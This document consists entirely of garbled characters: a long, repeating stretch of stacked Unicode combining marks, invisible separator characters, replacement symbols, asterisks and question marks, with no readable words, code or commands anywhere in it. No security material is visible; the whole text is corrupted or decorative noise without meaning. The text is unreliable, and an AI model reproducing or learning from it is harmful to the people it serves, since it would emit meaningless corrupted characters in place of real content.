̯̯͍͙̱̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̴̢̡̧̛̛̘͇͙̟̫͎͎̹̹͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̍̐̿̈́̈́͊͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̴̢̡̧̛̛̘͇͙̟̫͎͎̹̹͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̍̐̿̈́̈́͊͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̒͛͊͒